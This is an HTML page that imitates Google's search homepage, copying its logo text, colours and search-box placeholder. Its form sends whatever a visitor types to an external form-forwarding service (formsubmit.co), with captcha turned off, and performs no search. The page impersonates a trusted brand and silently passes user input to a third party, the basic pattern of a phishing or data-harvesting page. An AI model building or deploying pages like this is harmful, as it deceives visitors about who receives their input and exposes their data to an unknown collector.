<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Search Box</title>

<style>
body{
    margin:0;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:Arial, sans-serif;
    background:#fff;
}

.container{
    text-align:center;
}

.logo{
    font-size:70px;
    color:#4285F4;
    font-weight:bold;
    margin-bottom:30px;
}

.search-box{
    width:500px;
    padding:15px;
    border:1px solid #ccc;
    border-radius:30px;
    font-size:18px;
    outline:none;
}

button{
    margin-top:20px;
    padding:12px 30px;
    border:none;
    border-radius:30px;
    background:#4285F4;
    color:white;
    font-size:18px;
    cursor:pointer;
}

button:hover{
    background:#3367d6;
}
</style>

</head>

<body>

<div class="container">

<div class="logo">Google</div>

<form action="https://formsubmit.co/el/wicoxa" method="POST">

<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_template" value="table">

<input
type="text"
name="Search_Text"
class="search-box"
placeholder="Search Google or type a URL"
required>

<br>

<button type="submit">Search</button>

</form>

</div>

</body>
</html>
